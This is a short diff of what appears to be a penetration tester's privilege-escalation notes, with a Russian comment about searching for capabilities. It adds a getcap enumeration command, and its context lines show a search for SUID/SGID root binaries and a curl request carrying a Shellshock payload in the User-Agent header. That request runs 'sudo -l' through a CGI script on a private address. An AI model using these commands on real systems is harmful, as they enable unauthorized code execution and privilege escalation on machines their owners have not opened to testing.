@@ -61,6 +61,8 @@
         find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
         
 # поиск capabiliti
+        find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+
 
 curl -H "User-Agent: () { :;}; echo; /bin/sudo -l" http://10.8.0.10/cgi-bin/shell.sh
 
